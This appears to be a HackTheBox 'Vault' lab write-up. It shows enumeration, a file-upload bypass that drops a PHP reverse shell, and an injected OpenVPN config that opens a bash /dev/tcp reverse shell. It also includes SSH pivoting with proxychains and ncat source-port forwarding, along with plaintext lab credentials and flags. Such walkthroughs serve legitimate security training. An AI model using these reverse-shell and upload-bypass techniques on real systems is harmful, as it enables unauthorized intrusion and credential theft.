---
layout: post
title: Hackthebox Vault Writeup
categories: HackTheBox
---

<img src="/public/images/2019-04-07/vault_badge.png"><br>
## Explanation
<a href="https://www.hackthebox.eu">Hackthebox</a> is a website which has bunch of vulnerable machines in its own VPN.
This is a write-up of machine "Vault" on that website.

## Solution
### 1. Initial Enumeration
Port Scanning:
{% highlight shell %}
root@kali:~# nmap -p- 10.10.10.109 -sV -sC 
Starting Nmap 7.70 ( https://nmap.org ) at 2019-03-05 15:02 EET
Nmap scan report for 10.10.10.109
Host is up (0.036s latency).
Not shown: 65533 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 a6:9d:0f:7d:73:75:bb:a8:94:0a:b7:e3:fe:1f:24:f4 (RSA)
|   256 2c:7c:34:eb:3a:eb:04:03:ac:48:28:54:09:74:3d:27 (ECDSA)
|_  256 98:42:5f:ad:87:22:92:6d:72:e6:66:6c:82:c1:09:83 (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 33.36 seconds
{% endhighlight %}

Gobuster HTTP:
{% highlight shell %}
root@kali:~# gobuster -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -s '200,204,301,302,403' -u http://10.10.10.109/ -x .php

=====================================================
Gobuster v2.0.0              OJ Reeves (@TheColonial)
=====================================================
[+] Mode         : dir
[+] Url/Domain   : http://10.10.10.109/
[+] Threads      : 10
[+] Wordlist     : /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Status codes : 200,204,301,302,403
[+] Extensions   : php
[+] Timeout      : 10s
=====================================================
2019/03/05 15:06:18 Starting gobuster
=====================================================
/index.php (Status: 200)
/server-status (Status: 403)
=====================================================
2019/03/05 15:35:07 Finished
=====================================================
{% endhighlight %}

In index.php, there is a message "We are proud to announce our first client: Sparklays (Sparklays.com still under construction)".<br>
![placeholder](https://inar1.github.io/public/images/2019-04-07/2019-04-01-13-29-39.png)
Try to access to /sparklays.

Gobuster HTTP /sparklays:
{% highlight shell %}
root@kali:~# gobuster -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -s '200,204,301,302,403' -u http://10.10.10.109/sparklays -x .php

=====================================================
Gobuster v2.0.0              OJ Reeves (@TheColonial)
=====================================================
[+] Mode         : dir
[+] Url/Domain   : http://10.10.10.109/sparklays/
[+] Threads      : 10
[+] Wordlist     : /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Status codes : 200,204,301,302,403
[+] Extensions   : php
[+] Timeout      : 10s
=====================================================
2019/03/05 16:00:28 Starting gobuster
=====================================================
/login.php (Status: 200)
/admin.php (Status: 200)
/design (Status: 301)
=====================================================
2019/03/05 16:29:17 Finished
=====================================================
{% endhighlight %}

Gobuster HTTP /sparklays/design:
{% highlight shell %}
root@kali:~# gobuster -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -s '200,204,301,302,403' -u http://10.10.10.109/sparklays/design -x .php,.html

=====================================================
Gobuster v2.0.0              OJ Reeves (@TheColonial)
=====================================================
[+] Mode         : dir
[+] Url/Domain   : http://10.10.10.109/sparklays/design/
[+] Threads      : 10
[+] Wordlist     : /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Status codes : 200,204,301,302,403
[+] Extensions   : php,html
[+] Timeout      : 10s
=====================================================
2019/03/06 14:13:00 Starting gobuster
=====================================================
/uploads (Status: 301)
/design.html (Status: 200)
=====================================================
2019/03/06 14:58:17 Finished
=====================================================
{% endhighlight %}

### 2. Getting User

In "/sparklays/design/design.html", we have a link to "/sparklays/design/changelogo.php".<br>
"changelogo.php" has a form which we can upload a file.
![placeholder](https://inar1.github.io/public/images/2019-04-07/2019-04-01-15-35-18.png)

If we upload a image file, we can find it in the directory "/sparklays/design/uploads/".<br>
This form has file upload restriction but by changing file extension to "php5" and Content-type, we can bypass the restriction.
![placeholder](https://inar1.github.io/public/images/2019-04-07/2019-04-01-15-59-40.png)

By accessing uploaded php code, we can achieve a reverse shell.
{% highlight shell %}
# Access http://10.10.10.109/sparklays/design/uploads/php-reverse-shell.php5
root@kali:~# nc -nlvp 443
listening on [any] 443 ...
connect to [10.10.14.23] from (UNKNOWN) [10.10.10.109] 37380
Linux ubuntu 4.13.0-45-generic #50~16.04.1-Ubuntu SMP Wed May 30 11:18:27 UTC 2018 x86_64 x86_64 x86_64 GNU/Linux
 05:43:31 up  8:51,  0 users,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$
{% endhighlight %}

In "/home/dave/Desktop", we can find interesting files.
{% highlight shell %}
$ pwd
/home/dave/Desktop

$ ls -la
total 20
drwxr-xr-x  2 dave dave 4096 Sep  3  2018 .
drwxr-xr-x 18 dave dave 4096 Sep  3  2018 ..
-rw-rw-r--  1 alex alex   74 Jul 17  2018 Servers
-rw-rw-r--  1 alex alex   14 Jul 17  2018 key
-rw-rw-r--  1 alex alex   20 Jul 17  2018 ssh
{% endhighlight %}

In the contents of "/home/dave/Desktop/ssh", there is a ssh credential.<br>
{% highlight shell %}
dave:Dav3therav3123
{% endhighlight %}

We can have a ssh connection by taking advantage of that.
{% highlight shell%}
root@kali:~# ssh dave@10.10.10.109
dave@10.10.10.109's password: # Dav3therav3123

~~~

Last login: Sun Sep  2 07:17:32 2018 from 192.168.1.11
dave@ubuntu:~$ 
{% endhighlight %}

In the home directory, there is also an interesting file.
{% highlight shell %}
dave@ubuntu:~/Desktop$ cat Servers 
DNS + Configurator - 192.168.122.4
Firewall - 192.168.122.5
The Vault - x
{% endhighlight %}

Besides, in"keys", we can find a simple text.
{% highlight shell %}
dave@ubuntu:~/Desktop$ cat key 
itscominghome
{% endhighlight %}

We can execute nmap scanning for these servers by using <a href="https://github.com/rofl0r/proxychains-ng">Proxychains</a>.<br>
At first, add some settings in "/etc/proxychains.conf"
{% highlight shell %}
root@kali:~# tail /etc/proxychains.conf 
#
#       proxy types: http, socks4, socks5
#        ( auth types supported: "basic"-http  "user/pass"-socks )
#
[ProxyList]
# add proxy here ...
# meanwile
# defaults set to "tor"
socks4 	127.0.0.1 9050
{% endhighlight %}

Then, create a ssh connection.
{% highlight shell %}
root@kali:~# ssh -D 9050 dave@10.10.10.109
{% endhighlight %}

Then, execute following command.<br>
We can figure out on 192.168.122.4, ssh and http is running.
{% highlight shell %}
root@kali:~# proxychains nmap 10.10.10.109
ProxyChains-3.1 (http://proxychains.sf.net)
Starting Nmap 7.70 ( https://nmap.org ) at 2019-04-01 18:20 EEST
|S-chain|-<>-127.0.0.1:9050-<><>-10.10.10.109:80-<><>-OK
|S-chain|-<>-127.0.0.1:9050-<><>-10.10.10.109:22-<><>-OK
|S-chain|-<>-127.0.0.1:9050-<><>-10.10.10.109:139-<--timeout

~~~

|S-chain|-<>-127.0.0.1:9050-<><>-192.168.122.4:19350-<--timeout
|S-chain|-<>-127.0.0.1:9050-<><>-192.168.122.4:9101-<--timeout
Nmap scan report for 192.168.122.4
Host is up (0.036s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 36.08 seconds
{% endhighlight %}

Then, seeing what is the content of http server.
{% highlight shell %}
root@kali:~# proxychains curl http://192.168.122.4/
ProxyChains-3.1 (http://proxychains.sf.net)
|S-chain|-<>-127.0.0.1:9050-<><>-192.168.122.4:80-<><>-OK
<h1> Welcome to the Sparklays DNS Server </h1>
<p>
<a href="dns-config.php">Click here to modify your DNS Settings</a><br>
<a href="vpnconfig.php">Click here to test your VPN Configuration</a>
{% endhighlight %}

We can try to open this website with browser(But generally don't run web browser with root !!)
{% highlight shell %}
root@kali:~# proxychains google-chrome --no-sandbox
{% endhighlight %}
![placeholder](https://inar1.github.io/public/images/2019-04-07/2019-04-01-19-27-37.png)

In "/vpnconfig.php", we can find a form which we can edit / execute .ovpn file.
![placeholder](https://inar1.github.io/public/images/2019-04-07/2019-04-01-19-25-19.png)

After running netcat, by posting following data with "vpnconfig.php", we can achieve a reverse shell from VM "DNS"
{% highlight shell %}
remote 192.168.122.1
dev tun
nobind
script-security 2
up "/bin/bash -c 'bash -i >& /dev/tcp/192.168.122.1/4444 0>&1'"
{% endhighlight %}

{% highlight shell %}
dave@ubuntu:~$ nc -nlvp 4444
Listening on [0.0.0.0] (family 0, port 4444)
Connection from [192.168.122.4] port 4444 [tcp/*] accepted (family 2, sport 35236)
bash: cannot set terminal process group (1123): Inappropriate ioctl for device
bash: no job control in this shell
root@DNS:/var/www/html#
{% endhighlight %}

user.txt is in directory "/home/dave":
{% highlight shell %}
root@DNS:/home/dave# cat user.txt
cat user.txt
a4947faa8d4e1f80771d34234bd88c73
{% endhighlight %}

### 3. Getting Root

In directory "/home/dave" on DNS, we can find an interesting file.
{% highlight shell %}
root@DNS:/home/dave# cat ssh
cat ssh
dave
dav3gerous567
{% endhighlight %}

This is a credential which we can access "DNS" with ssh.
{% highlight shell %}
dave@ubuntu:~$ ssh dave@192.168.122.4
dave@192.168.122.4's password: # dav3gerous567
Welcome to Ubuntu 16.04.4 LTS (GNU/Linux 4.4.0-116-generic i686)

~~~

Last login: Sat Apr  6 10:28:23 2019 from 192.168.122.1
dave@DNS:~$
{% endhighlight %}

By following command, we can figure out that we can execute any command as root.
{% highlight shell %}
dave@DNS:/home$ sudo -l
[sudo] password for dave: 
Matching Defaults entries for dave on DNS:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User dave may run the following commands on DNS:
    (ALL : ALL) ALL
{% endhighlight %}

Besides, in "/etc/hosts", we can find an IP address of "vault"
{% highlight shell %}
dave@DNS:~$ cat /etc/hosts
127.0.0.1	localhost
127.0.1.1	DNS
192.168.5.2	Vault
# The following lines are desirable for IPv6 capable hosts
::1     localhost ip6-localhost ip6-loopback
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters
{% endhighlight %}

If we try to find this IP address in other place, we can find "auth.log".<br>
This looks like trying to execute nmap from port -4444.
{% highlight shell %}
root@DNS:/var/log# grep "192.168.5.2" -rl /var/log 2>/dev/null
/var/log/auth.log
/var/log/btmp

root@DNS:/var/log# cat auth.log | grep -a "192.168.5.2"

~~~

Sep  2 15:07:51 DNS sudo:     dave : TTY=pts/0 ; PWD=/home/dave ; USER=root ; COMMAND=/usr/bin/nmap 192.168.5.2 -Pn --source-port=4444 -f
Sep  2 15:10:20 DNS sudo:     dave : TTY=pts/0 ; PWD=/home/dave ; USER=root ; COMMAND=/usr/bin/ncat -l 1234 --sh-exec ncat 192.168.5.2 987 -p 53
Sep  2 15:10:34 DNS sudo:     dave : TTY=pts/0 ; PWD=/home/dave ; USER=root ; COMMAND=/usr/bin/ncat -l 3333 --sh-exec ncat 192.168.5.2 987 -p 53
{% endhighlight %}

If we execute these command, we can see unknown service is running on port 987
{% highlight shell %}
root@DNS:~# nmap 192.168.5.2 --source-port=4444

Starting Nmap 7.01 ( https://nmap.org ) at 2019-04-06 22:50 BST
mass_dns: warning: Unable to determine any DNS servers. Reverse DNS is disabled. Try using --system-dns or specify valid servers with --dns-servers
Nmap scan report for Vault (192.168.5.2)
Host is up (0.0023s latency).
Not shown: 999 closed ports
PORT    STATE SERVICE
987/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 25.84 seconds
{% endhighlight %}

If we don't specify the option "--source-port=4444", we don't see any result.
{% highlight shell %}
root@DNS:~# nmap 192.168.5.2

Starting Nmap 7.01 ( https://nmap.org ) at 2019-04-06 22:53 BST
mass_dns: warning: Unable to determine any DNS servers. Reverse DNS is disabled. Try using --system-dns or specify valid servers with --dns-servers
Note: Host seems down. If it is really up, but blocking our ping probes, try -Pn
Nmap done: 1 IP address (0 hosts up) scanned in 3.04 seconds
{% endhighlight %}

By running nc from DNS, we can figure out that service is ssh
{% highlight shell %}
root@DNS:~# nc 192.168.5.2 987 -p 4444
SSH-2.0-OpenSSH_7.2p2 Ubuntu-4ubuntu2.4
{% endhighlight %}

This means, we have to connect ssh on port 987 from port 4444.<br>
We need following command to achieve this purpose.
{% highlight shell %}
root@DNS:~# ncat -l 1234 --sh-exec "ncat -p 4444 192.168.5.2 987"
{% endhighlight %}

We can confirm that we opened port 1234 on localhost by netstat
{% highlight shell %}
root@DNS:~# netstat -nlp
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name
tcp        0      0 0.0.0.0:1234            0.0.0.0:*               LISTEN      14274/ncat      
{% endhighlight%}

By following command, we can connect to VM "Vault".
{% highlight shell %}
root@DNS:~# ssh dave@127.0.0.1 -p 1234
dave@127.0.0.1's password: 
Welcome to Ubuntu 16.04.4 LTS (GNU/Linux 4.4.0-116-generic i686)

~~~

Last login: Sat Apr  6 12:36:57 2019 from 192.168.122.4
dave@vault:~$ 
{% endhighlight %}

In the home directory of dave, we can find a gyg encrypted file "root.txt.png".
{% highlight shell %}
dave@vault:~$ ls -l
total 4
-rw-rw-r-- 1 dave dave 629 Sep  3  2018 root.txt.gpg

dave@vault:~$ file root.txt.gpg
root.txt.gpg: PGP RSA encrypted session key - keyid: 10C678C7 31FEBD1 RSA (Encrypt or Sign) 4096b .
{% endhighlight %}

It seems like we need a secret key to encrypt this file.
{% highlight shell %}
dave@vault:~$ gpg -d root.txt.gpg
gpg: directory `/home/dave/.gnupg' created
gpg: new configuration file `/home/dave/.gnupg/gpg.conf' created
gpg: WARNING: options in `/home/dave/.gnupg/gpg.conf' are not yet active during this run
gpg: keyring `/home/dave/.gnupg/secring.gpg' created
gpg: keyring `/home/dave/.gnupg/pubring.gpg' created
gpg: encrypted with RSA key, ID D1EB1F03
gpg: decryption failed: secret key not available
{% endhighlight %}

We need a secret key file for gpg file. We can find it on VM "ubuntu" by command "gpg --list-secret-keys".
{% highlight shell %}
dave@ubuntu:~$ gpg --list-secret-keys
/home/dave/.gnupg/secring.gpg
-----------------------------
sec   4096R/0FDFBFE4 2018-07-24
uid                  david <dave@david.com>
ssb   4096R/D1EB1F03 2018-07-24
{% endhighlight %}

Copy the "root.txt.gpg" to VM "ubuntu".<br>
{% highlight shell %}
# On vault
dave@vault:~$ base32 root.txt.gpg
QUBAYA6HPDDBBUPLD4BQCEAAUCMOVUY2GZXH4SL5RXIOQQYVMY4TAUFOZE64YFASXVITKTD56JHD
LIHBLW3OQMKSHQDUTH3R6QKT3MUYPL32DYMUVFHTWRVO5Q3YLSY2R4K3RUOYE5YKCP2PAX7S7OJB
GMJKKZNW6AVN6WGQNV5FISANQDCYJI656WFAQCIIHXCQCTJXBEBHNHGQIMTF4UAQZXICNPCRCT55
AUMRZJEQ2KSYK7C3MIIH7Z7MTYOXRBOHHG2XMUDFPUTD5UXFYGCWKJVOGGBJK56OPHE25OKUQCRG
VEVINLLC3PZEIAF6KSLVSOLKZ5DWWU34FH36HGPRFSWRIJPRGS4TJOQC3ZSWTXYPORPUFWEHEDOE
OPWHH42565HTDUZ6DPJUIX243DQ45HFPLMYTTUW4UVGBWZ4IVV33LYYIB32QO3ONOHPN5HRCYYFE
CKYNUVSGMHZINOAPEIDO7RXRVBKMHASOS6WH5KOP2XIV4EGBJGM4E6ZSHXIWSG6EM6ODQHRWOAB3
AGSLQ5ZHJBPDQ6LQ2PVUMJPWD2N32FSVCEAXP737LZ56TTDJNZN6J6OWZRTP6PBOERHXMQ3ZMYJI
UWQF5GXGYOYAZ3MCF75KFJTQAU7D6FFWDBVQQJYQR6FNCH3M3Z5B4MXV7B3ZW4NX5UHZJ5STMCTD
ZY6SPTKQT6G5VTCG6UWOMK3RYKMPA2YTPKVWVNMTC62Q4E6CZWQAPBFU7NM652O2DROUUPLSHYDZ
6SZSO72GCDMASI2X3NGDCGRTHQSD5NVYENRSEJBBCWAZTVO33IIRZ5RLTBVR7R4LKKIBZOVUSW36
G37M6PD5EZABOBCHNOQL2HV27MMSK3TSQJ4462INFAB6OS7XCSMBONZZ26EZJTC5P42BGMXHE274
64GCANQCRUWO5MEZEFU2KVDHUZRMJ6ABNAEEVIH4SS65JXTGKYLE7ED4C3UV66ALCMC767DKJTBK
TTAX3UIRVNBQMYRI7XY=

# On ubuntu
dave@ubuntu:~$ echo "QUBAYA6HPDDBBUPLD4BQCEAAUCMOVUY2GZXH4SL5RXIOQQYVMY4TAUFOZE64YFASXVITKTD56JHDLIHBLW3OQMKSHQDUTH3R6QKT3MUYPL32DYMUVFHTWRVO5Q3YLSY2R4K3RUOYE5YKCP2PAX7S7OJBGMJKKZNW6AVN6WGQNV5FISANQDCYJI656WFAQCIIHXCQCTJXBEBHNHGQIMTF4UAQZXICNPCRCT55AUMRZJEQ2KSYK7C3MIIH7Z7MTYOXRBOHHG2XMUDFPUTD5UXFYGCWKJVOGGBJK56OPHE25OKUQCRGVEVINLLC3PZEIAF6KSLVSOLKZ5DWWU34FH36HGPRFSWRIJPRGS4TJOQC3ZSWTXYPORPUFWEHEDOEOPWHH42565HTDUZ6DPJUIX243DQ45HFPLMYTTUW4UVGBWZ4IVV33LYYIB32QO3ONOHPN5HRCYYFECKYNUVSGMHZINOAPEIDO7RXRVBKMHASOS6WH5KOP2XIV4EGBJGM4E6ZSHXIWSG6EM6ODQHRWOAB3AGSLQ5ZHJBPDQ6LQ2PVUMJPWD2N32FSVCEAXP737LZ56TTDJNZN6J6OWZRTP6PBOERHXMQ3ZMYJIUWQF5GXGYOYAZ3MCF75KFJTQAU7D6FFWDBVQQJYQR6FNCH3M3Z5B4MXV7B3ZW4NX5UHZJ5STMCTDZY6SPTKQT6G5VTCG6UWOMK3RYKMPA2YTPKVWVNMTC62Q4E6CZWQAPBFU7NM652O2DROUUPLSHYDZ6SZSO72GCDMASI2X3NGDCGRTHQSD5NVYENRSEJBBCWAZTVO33IIRZ5RLTBVR7R4LKKIBZOVUSW36G37M6PD5EZABOBCHNOQL2HV27MMSK3TSQJ4462INFAB6OS7XCSMBONZZ26EZJTC5P42BGMXHE27464GCANQCRUWO5MEZEFU2KVDHUZRMJ6ABNAEEVIH4SS65JXTGKYLE7ED4C3UV66ALCMC767DKJTBKTTAX3UIRVNBQMYRI7XY=" > root_txt.gpg

dave@ubuntu:~$ base32 -d root_txt.gpg > root.txt.gpg
{% endhighlight %}

We can decrypt root.txt.gpg by key "itscominghome" in the same directory.
{% highlight shell %}
dave@ubuntu:~$ cat Desktop/key 
itscominghome

dave@ubuntu:~$ gpg -d root.txt.gpg 

You need a passphrase to unlock the secret key for
user: "david <dave@david.com>"
4096-bit RSA key, ID D1EB1F03, created 2018-07-24 (main key ID 0FDFBFE4)

gpg: encrypted with 4096-bit RSA key, ID D1EB1F03, created 2018-07-24
      "david <dave@david.com>"
ca468370b91d1f5906e31093d9bfe819
{% endhighlight %}
